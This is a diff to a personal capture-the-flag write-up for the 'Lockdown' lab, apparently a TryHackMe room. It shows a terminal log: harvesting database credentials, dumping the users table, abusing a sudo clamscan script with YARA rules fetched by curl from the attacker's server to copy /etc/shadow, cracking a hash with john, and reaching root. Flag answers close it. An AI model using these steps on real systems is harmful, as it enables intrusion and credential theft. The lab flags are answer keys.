@@ -375,3 +375,380 @@ www-data@lockdown:/home$ ls
 ls
 cyrus  maxine
 www-data@lockdown:/home$ cd cyrus
+cd cyrus
+bash: cd: cyrus: Permission denied
+www-data@lockdown:/home$ cd maxine
+cd maxine
+bash: cd: maxine: Permission denied
+www-data@lockdown:/home$ cd /var/www/html
+cd /var/www/html
+www-data@lockdown:/var/www/html$ ls
+ls
+404.html   build       cts_qr_card.png	inc	   login.php  uploads
+README.md  classes     dist		index.php  plugins
+admin	   config.php  home.php		libs	   temp
+www-data@lockdown:/var/www/html$ cd classes
+cd classes
+www-data@lockdown:/var/www/html/classes$ ls
+ls
+City.php	   Login.php   State.php	   Users.php
+DBConnection.php   Main.php    SystemSettings.php  Zone.php
+Establishment.php  People.php  TEST.php
+www-data@lockdown:/var/www/html/classes$ cat DBConnection.php
+cat DBConnection.php
+<?php
+class DBConnection{
+
+    private $host = 'localhost';
+    private $username = 'cts';
+    private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';
+    private $database = 'cts_db';
+    
+    public $conn;
+    
+    public function __construct(){
+
+        if (!isset($this->conn)) {
+            
+            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
+            
+            if (!$this->conn) {
+                echo 'Cannot connect to database server';
+                exit;
+            }            
+        }    
+        
+    }
+    public function __destruct(){
+        $this->conn->close();
+    }
+}
+
+?>www-data@lockdown:/var/www/html/classes$ mysql -u cts -p
+mysql -u cts -p
+Enter password: YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2396
+Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show tables;
+show tables;
+ERROR 1046 (3D000): No database selected
+mysql> sshow databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| cts_db             |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql> use cts_db;
+use cts_db;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++------------------+
+| Tables_in_cts_db |
++------------------+
+| barangay_list    |
+| city_list        |
+| establishment    |
+| people           |
+| state_list       |
+| system_info      |
+| tracks           |
+| users            |
++------------------+
+8 rows in set (0.00 sec)
+
+mysql> select * from users;
+select * from users;
++----+--------------+----------+----------+----------+-------------------------------------+------------+---------------------+---------------------+
+| id | firstname    | lastname | username | password | avatar                              | last_login | date_added          | date_updated        |
++----+--------------+----------+----------+----------+-------------------------------------+------------+---------------------+---------------------+
+|  1 | Adminstrator | Admin    | admin    | admin    | uploads/1688526480_payload_ivan.php | NULL       |  |  |
++----+--------------+----------+----------+----------+-------------------------------------+------------+---------------------+---------------------+
+1 row in set (0.00 sec)
+
+asshh is cz i changed the pass of admin
+
+mysql> select * from users;
+select * from users;
++----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
+| id | firstname    | lastname | username | password                         | avatar                        | last_login | date_added          | date_updated        |
++----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
+|  1 | Adminstrator | Admin    | admin    | 3eba6f73c19818c36ba8fea761a3ce6d | uploads/1614302940_avatar.jpg | NULL       | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 |
++----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
+1 row in set (0.00 sec)
+
+sweetpandemonium
+
+www-data@lockdown:/var/www/html/classes$ su cyrus
+su cyrus
+Password: sweetpandemonium
+
+cyrus@lockdown:/var/www/html/classes$ cd /home
+cd /home
+cyrus@lockdown:/home$ ls
+ls
+cyrus  maxine
+cyrus@lockdown:/home$ cd cyrus
+cd cyrus
+cyrus@lockdown:~$ ls
+ls
+quarantine  testvirus  user.txt
+cyrus@lockdown:~$ cat user.txt
+cat user.txt
+THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}
+
+cyrus@lockdown:~$ sudo -l
+sudo -l
+[sudo] password for cyrus: sweetpandemonium
+
+Matching Defaults entries for cyrus on lockdown:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User cyrus may run the following commands on lockdown:
+    (root) /opt/scan/scan.sh
+cyrus@lockdown:~$ cat /opt/scan/scan.sh
+cat /opt/scan/scan.sh
+#!/bin/bash
+
+read -p "Enter path: " TARGET
+
+if [[ -e "$TARGET" && -r "$TARGET" ]]
+  then
+    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
+    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
+  else
+    echo "Invalid or inaccessible path."
+fi
+
+cyrus@lockdown:~$ sudo /opt/scan/scan.sh
+sudo /opt/scan/scan.sh
+Enter path: /root
+/root
+/root/.bashrc: OK
+/root/root.txt: OK
+/root/.profile: OK
+
+----------- SCAN SUMMARY -----------
+Known viruses: 1
+Engine version: 0.103.2
+Scanned directories: 1
+Scanned files: 3
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 0.640 sec (0 m 0 s)
+Start Date: 2023:07:05 23:22:48
+End Date:   2023:07:05 23:22:49
+
+cyrus@lockdown:~$ ls /var/lib/clamav
+ls /var/lib/clamav
+main.hdb  mirrors.dat
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat root.yar 
+rule CheckFileName
+{
+  strings:
+    $a = "root"
+    $b = "THM"
+    
+  condition:
+    $a or $b
+}
+
+cyrus@lockdown:/var/lib/clamav$ curl http://10.8.19.103:8080/root.yar -o root.yar
+<$ curl http://10.8.19.103:8080/root.yar -o root.yar
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    96  100    96    0     0    202      0 --:--:-- --:--:-- --:--:--   202
+cyrus@lockdown:/var/lib/clamav$ cat root.yar
+cat root.yar
+rule CheckFileName
+{
+  strings:
+    $a = "root"
+    $b = "THM"
+    
+  condition:
+    $a or $b
+}
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.152.170 - - [05/Jul/2023 19:27:09] "GET /root.yar HTTP/1.1" 200 -
+
+cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
+sudo /opt/scan/scan.sh
+Enter path: /root
+/root
+/root/.bashrc: YARA.CheckFileName.UNOFFICIAL FOUND
+/root/.bashrc: copied to '/home/cyrus/quarantine/.bashrc'
+/root/root.txt: YARA.CheckFileName.UNOFFICIAL FOUND
+/root/root.txt: copied to '/home/cyrus/quarantine/root.txt'
+/root/.profile: OK
+
+----------- SCAN SUMMARY -----------
+Known viruses: 2
+Engine version: 0.103.2
+Scanned directories: 1
+Scanned files: 3
+Infected files: 2
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 0.637 sec (0 m 0 s)
+Start Date: 2023:07:05 23:27:47
+End Date:   2023:07:05 23:27:47
+cyrus@lockdown:/var/lib/clamav$ cat /home/cyrus/quarantine/root.txt
+cat /home/cyrus/quarantine/root.txt
+THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat shadow.yar 
+rule root
+{
+ strings:
+  $s = "cyrus" nocase
+ condition:
+  $s
+}
+
+cyrus@lockdown:/var/lib/clamav$ curl http://10.8.19.103:8080/shadow.yar -o shadow.yar
+<rl http://10.8.19.103:8080/shadow.yar -o shadow.yar
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    63  100    63    0     0    132      0 --:--:-- --:--:-- --:--:--   132
+cyrus@lockdown:/var/lib/clamav$ cat shadow.yar
+cat shadow.yar
+rule root
+{
+ strings:
+  $s = "cyrus" nocase
+ condition:
+  $s
+}
+
+cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
+sudo /opt/scan/scan.sh
+Enter path: /etc/shadow
+/etc/shadow
+/etc/shadow: YARA.CheckFileName.UNOFFICIAL FOUND
+/etc/shadow: copied to '/home/cyrus/quarantine/shadow'
+
+----------- SCAN SUMMARY -----------
+Known viruses: 3
+Engine version: 0.103.2
+Scanned directories: 0
+Scanned files: 1
+Infected files: 1
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 0.320 sec (0 m 0 s)
+Start Date: 2023:07:05 23:30:46
+End Date:   2023:07:05 23:30:47
+
+cyrus@lockdown:/var/lib/clamav$ cat /home/cyrus/quarantine/shadow
+cat /home/cyrus/quarantine/shadow
+root:*:18480:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18757:0:99999:7:::
+maxine:$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
+cyrus:$6$YWzR.V19JxyENT/D$KuSzWbb6V0iXfIcA/88Buum92Fr5lBu6r.kMoQYAdfvbJuHjO7i7wodoahlZAYfFhIuymOaEWxGlo0WkhbqaI1:18757:0:99999:7:::
+mysql:!:18758:0:99999:7:::
+clamav:!:18758:0:99999:7:::
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ echo '$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320' > maxine_hash
+                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt maxine_hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tiarna           (?)     
+1g 0:00:01:05 DONE () 0.01530g/s 1237p/s 1237c/s 1237C/s vivita..skyline123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+cyrus@lockdown:/var/lib/clamav$ su maxine
+su maxine
+Password: tiarna
+
+maxine@lockdown:/var/lib/clamav$ sudo -l
+sudo -l
+[sudo] password for maxine: tiarna
+
+Matching Defaults entries for maxine on lockdown:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User maxine may run the following commands on lockdown:
+    (ALL : ALL) ALL
+maxine@lockdown:/var/lib/clamav$ sudo su
+sudo su
+root@lockdown:/var/lib/clamav# cd /root
+cd /root
+root@lockdown:~# l
+l
+root.txt
+root@lockdown:~# cat root.txt
+cat root.txt
+THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}
+```
+![[Pasted image 20230704220727.png]]
+![[Pasted image 20230704222608.png]]
+What is the user flag?
+What is the root flag?
+
+## Flags / Answers
+- ***THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}***
+- ***THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}***
+
+## Notes / Lessons Learned
+[[battery]]
+
